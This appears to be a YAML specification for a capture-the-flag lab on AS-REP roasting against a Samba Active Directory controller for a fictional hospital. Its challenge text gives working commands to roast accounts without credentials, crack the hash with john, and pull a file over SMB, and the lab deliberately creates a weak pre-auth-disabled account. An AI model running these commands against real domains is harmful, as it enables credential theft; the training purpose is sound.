# yaml-language-server: $schema=https://www.isoloom.com/schema/v1.json
# AS-REP roasting as ONE Isoloom lab that runs BOTH as a container and as a VM, from this single
# spec. The domain controller `dc` is a Samba Active Directory DC for LAKESIDE.LAB (Lakeside
# Regional Hospital, a healthcare provider):
#   * `isoloom generate docker`  -> the Fedora/Samba container built from build/dc (its entrypoint
#     self-provisions the realm);
#   * `isoloom generate vagrant` (and proxmox/esxi/aws/azure) -> a Fedora VM that Isoloom's Ansible
#     controller sets up with provision/dc.yml.
# Both forms are Fedora on purpose: Fedora's Samba is built against the MIT KDC, which honours
# UF_DONT_REQUIRE_PREAUTH, so the classic no-pre-auth AS-REP roast works. Debian/Ubuntu Samba is
# Heimdal and answers KDC_ERR_PREAUTH_REQUIRED, which would make the lab unsolvable -- so the OS is
# a hard requirement, not a preference. A legacy service account (svc-scanner) has pre-auth
# disabled and a weak password, and an imaging share only it may read holds the flag. With nothing
# but a username list, the student AS-REP roasts svc-scanner, cracks the $krb5asrep$ hash offline,
# and reads the flag.
version: 1

name: asrep-roast-lakeside

# Given by the CyberCTF launcher: this player's flag. Without it the development flag.
inputs: [CTF_FLAG_MAIN]

networks:
  # internet:true so the VM form can install Samba + the roast tooling at provision time (dnf/pip);
  # the container form bakes those at build time and does not use egress. The attack is internal,
  # so egress does not trivialise it.
  lab: { cidr: 10.30.10.0/24, internet: true }

machines:
  dc:
    # The VM form: a Fedora VM (MIT KDC). Ignored by the container form, which builds from build/dc.
    os: fedora@42
    networks: { lab: 10 }
    aliases: [dc.lakeside.lab, lakeside.lab]
    resources: { cpus: 2, memory_mb: 4096 }
    ports:
      dns:         { port: 53,   protocol: tcp }
      dns-udp:     { port: 53,   protocol: udp }
      kerberos:    { port: 88,   protocol: tcp }
      kerberos-udp: { port: 88,  protocol: udp }
      ldap:        { port: 389,  protocol: tcp }
      smb:         { port: 445,  protocol: tcp }
      kpasswd:     { port: 464,  protocol: tcp }
      kpasswd-udp: { port: 464,  protocol: udp }
      ldaps:       { port: 636,  protocol: tls }
      gc:          { port: 3268, protocol: tcp }
    # The flag arrives as a file before the DC starts (Isoloom's sensitive-input mechanism). The
    # same Linux path serves both forms: the container entrypoint and provision/dc.yml both copy
    # /ctf/flag into the imaging share that only svc-scanner may read.
    files:
      - { path: /ctf/flag, input: CTF_FLAG_MAIN, mode: "0444" }
    # The container form: a pre-built image (published to Docker Hub by .github/workflows/image.yml)
    # beside the local build, so the launcher pulls the published image when it can and only builds
    # build/dc when it cannot. The tag is the Compose service name (`dc`). `steps` is the VM form's
    # recipe (the container form uses image/build and ignores it): the same Fedora Samba AD DC, set
    # up on a VM by provision/dc.yml. It mirrors build/dc -- install Samba AD and the impacket roast
    # tooling, provision LAKESIDE.LAB, create the staff and svc-scanner, plant the flag, and run the
    # DC as a systemd service -- so /opt/asrep/check.sh proves either form.
    app:
      image: cyberctf/ad-asrep-roasting:dc
      build: build/dc
      steps:
        - playbook: provision/dc.yml

checks:
  - { name: the KDC answers, tcp: dc:88, wait: 300 }
  - { name: LDAP answers, tcp: dc:389, wait: 300 }
  - { name: SMB answers, tcp: dc:445, wait: 300 }
  # End-to-end AS-REP roast, driven from inside the DC: a pre-auth-less AS-REQ against the username
  # list yields svc-scanner's $krb5asrep$ hash, cracked (crack.py; a student uses john) to the weak
  # password, and that password reads the flag. The same script proves both forms, because the DC
  # is a Fedora Samba MIT-KDC DC either way. Passes only when the DC is genuinely roastable.
  - name: AS-REP roasting svc-scanner recovers the password and unlocks the flag
    from: dc
    exec: /opt/asrep/check.sh
    expect: ASREP_OK
    wait: 300

message: |
  # AS-REP Roasting — Lakeside Regional Hospital (LAKESIDE.LAB)

  **Lakeside Regional Hospital** runs its network on a single Active Directory Domain
  Controller (Samba) for the realm **LAKESIDE.LAB**:

  - **DC:** `dc.lakeside.lab` at `{{ machines.dc.addresses.lab }}` (KDC 88, LDAP 389, SMB 445).
  - You have only a list of likely usernames (no credentials).

  **Objective:** a legacy document-scanner service account has **Kerberos pre-authentication
  disabled** (`userAccountControl` bit `DONT_REQ_PREAUTH`). The AS-REP for such an account — the
  KDC reply encrypted with the account's own key — is the crackable material of an AS-REP roast.
  Recover that account's password and use it to read the flag from a share you cannot otherwise
  open.

  Point your attack box's resolver and `/etc/krb5.conf` at the DC, then:

  1. **AS-REP roast the username list (no credentials):**
     `GetNPUsers.py LAKESIDE.LAB/ -usersfile users.txt -no-pass -dc-ip {{ machines.dc.addresses.lab }} -format john`
     (or `nxc ldap {{ machines.dc.addresses.lab }} -u users.txt -p '' --asreproast out.txt`)
     → only `svc-scanner`, the pre-auth-disabled account, returns a `$krb5asrep$...` hash; the
     ordinary staff accounts are refused. This is a modern DC, so the hash is AES (`$krb5asrep$18$`).
  2. **Crack it:** `john --format=krb5asrep --wordlist=rockyou.txt asrep.hash` (the password is a
     weak word built from the scanner service's name and a year). John's `krb5asrep` format cracks
     the AES AS-REP; `hashcat -m 18200` only handles the older RC4 form.
  3. **Loot the flag:** `smbclient //dc/imaging -U 'LAKESIDE\svc-scanner%<cracked>' -c 'get flag.txt'`.

  Submit the contents of `flag.txt`.
